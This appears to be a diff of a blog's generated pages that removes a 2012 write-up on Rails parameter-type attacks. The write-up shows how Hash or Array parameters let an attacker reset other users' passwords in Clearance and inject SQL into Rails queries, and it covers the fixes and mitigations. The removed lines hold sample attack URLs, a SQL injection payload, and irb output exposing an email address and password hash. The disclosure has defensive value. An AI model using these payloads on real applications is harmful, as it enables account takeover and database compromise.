-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
-</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">].</span><span class="n">to_s</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">to_s</span><span class="p">)</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Not Just Arrays (SQL Manipulation)</h2>
-
-<p>If Johnny had a used the <code>where</code> function instead of <code>find_by_</code> then an attacker could have exploited it by passing in a <code>Hash</code> instead of an <code>Array</code>.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>    <span class="k">return</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="ss">:reset_token</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">else</span>
-</span><span class='line'>    <span class="n">flash_failure_after_update</span>
-</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For example Mary could of sent the url <code>/users/2/passwords/edit?reset_token[users.id]=2</code>. The query then performed would have been:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
-</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="nb">id</span><span class="sb">` = 2 LIMIT 1</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
-to arbitrary SQL injection. This attack uses the <a href="https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b">previously fixed issue</a> of SQL injection in table names and columns. This bug was originally not
-as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
-attacker is now able to change table and column names to perform SQL injection.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">params</span><span class="o">[</span><span class="ss">:role_id</span><span class="o">]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user_details.id` = 1 or 1 = 1); -- &quot;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">}</span>
-</span><span class='line'><span class="no">UserDetail</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="ss">:all</span><span class="p">,</span> <span class="ss">:conditions</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="ss">:role_id</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:role_id</span><span class="o">]</span><span class="p">})</span>
-</span><span class='line'>
-</span><span class='line'><span class="no">UserDetail</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">5</span><span class="n">ms</span><span class="p">)</span>   <span class="no">SELECT</span> <span class="o">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span>
-</span><span class='line'><span class="p">(</span><span class="sb">`user_details`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 or 1 = 1); -- `</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This <code>Hash</code> problem is actually a security bug in rails and the rails team has released a patch for it.</p>
-
-<h2>Underlying Problem</h2>
-
-<p>The problem is developers expect the user input to be a <code>String</code> but it can also be an <code>Array</code> or a <code>Hash</code> and Rails has quite different behaviour if a <code>Hash</code> or an <code>Array</code> is passed in. The <code>Hash</code> is particularly troubling because if you have a filter on column X then a user can change it to be a filter on column Y. Example:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">001</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="s2">&quot;foo&quot;</span><span class="p">)</span>
-</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
-</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">confirmation_token</span><span class="sb">` = &#39;foo&#39;</span>
-</span><span class='line'><span class="sb">=&gt; []</span>
-</span></code></pre></td></tr></table></div></figure>
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
 
 
 
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">002</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">,</span> <span class="ss">:confirmation_token</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
-</span><span class='line'>  <span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">4</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 1 </span>
-</span><span class='line'><span class="sb">    AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="nb">id</span><span class="sb">` = 1</span>
-</span><span class='line'><span class="sb">=&gt; [#&lt;User id: 1, email: &quot;benmmurphy@gmail.com&quot;, encrypted_password: &quot;f1fcf94f12b17a447e1c4a98ba2bae934aacabb7&quot;, salt: &quot;abcb87e3031102d110cf87734d39d8a1e6d8c03e&quot;, confirmation_token: nil, remember_token: &quot;975dc5fb3524a90f1a6aff4c1a111d2cd8bfcc50&quot;, created_at: &quot;2012-05-15 08:28:01&quot;, updated_at: &quot;2012-05-15 08:28:01&quot;&gt;]</span>
-</span></code></pre></td></tr></table></div></figure>
 
-
-<p>This <code>Hash</code> trick only seems to work on <code>where</code> filterings and not <code>find_by</code> methods:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">irb</span><span class="p">(</span><span class="n">main</span><span class="p">):</span><span class="mo">006</span><span class="p">:</span><span class="mi">0</span><span class="o">&gt;</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_confirmation_token</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;users.id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;1&quot;</span><span class="p">})</span>
-</span><span class='line'><span class="no">ArgumentError</span><span class="p">:</span> <span class="no">Unknown</span> <span class="n">key</span><span class="p">:</span> <span class="n">users</span><span class="o">.</span><span class="n">id</span>
-</span><span class='line'>  <span class="n">from</span><span class="sr"> /Users/</span><span class="n">benmurphy</span><span class="o">/.</span><span class="n">rbenv</span><span class="o">/</span><span class="n">versions</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="n">p290</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">9</span><span class="o">.</span><span class="mi">1</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">activesupport</span><span class="o">-</span><span class="mi">3</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="mi">2</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">active_support</span><span class="o">/</span><span class="n">core_ext</span><span class="o">/</span><span class="nb">hash</span><span class="o">/</span><span class="n">keys</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">44</span><span class="ss">:in</span> <span class="sb">`block in assert_valid_keys&#39;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Vulnerable Code</h2>
-
-<ul>
-<li>https://github.com/thoughtbot/clearance - Possible to change any users password.</li>
-<li>Rails ( 2.3.x, &lt; 3.2.6, &lt;3.1.6, &lt; 3.0.14) SQL manipulation/SQL injection anywhere there is use of <code>where()</code> or <code>find()</code> that takes user input.</li>
-</ul>
-
-
-<h2>Fixes</h2>
-
-<ul>
-<li>Rails has <a href="http://weblog.rubyonrails.org/2012/6/12/ann-rails-3-2-6-has-been-released/">released 3.2.6</a> that fixes both the nil issue and SQL manipulation/injection problems with <code>Hash</code>.</li>
-<li>Clearance has released a new version <a href="http://robots.thoughtbot.com/post/24197949040/clearance-0-16-3-fixes-a-password-reset-vulnerability">0.6.13</a> which fixes the problem with nil parameters</li>
-</ul>
-
-
-<h2>Mitigation</h2>
-
-<p>It is recommended that you install the Rails patches to fix the <code>Hash</code> problem and nil problem. Also, with security sensitive code I strongly recommend all query
-parameters be coerced to the type you expect them to be. For example if you expect a parameter to be a <code>String</code> you should call <code>to_s</code> on it.</p>
-
-<h2>Previous Work</h2>
-
-<p>The Devise team seem to have been aware of the general problem of users being able to send non-string parameters. They have a <code>ParamFilter</code>
-class that forces all parameters to be <code>String</code>s. It looks like they did this because they had an injection problem with mongoid.</p>
-
-<figure class='code'><figcaption><span>ParamFilter </span><a href='https://github.com/plataformatec/devise/blob/master/lib/devise/param_filter.rb#L26'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Force keys to be string to avoid injection on mongoid related database.</span>
-</span><span class='line'><span class="k">def</span> <span class="nf">stringify_params</span><span class="p">(</span><span class="n">conditions</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">return</span> <span class="n">conditions</span> <span class="k">unless</span> <span class="n">conditions</span><span class="o">.</span><span class="n">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
-</span><span class='line'>  <span class="n">conditions</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="o">|</span>
-</span><span class='line'>    <span class="n">conditions</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">v</span><span class="o">.</span><span class="n">to_s</span> <span class="k">if</span> <span class="n">param_requires_string_conversion?</span><span class="p">(</span><span class="n">v</span><span class="p">)</span>
-</span><span class='line'>  <span class="k">end</span>
-</span><span class='line'><span class="k">end</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Stay Tuned</h2>
-
-<p>We only covered the issues fixed in 3.2.5 and 3.2.4 in this article. There was another variant of the <code>Hash</code> attack that was fixed in 3.2.6. I will cover
-that in a future article and show how to exploit it.</p>
-]]></content>
-  </entry>
-  
-</feed>
+</body>
+</html>
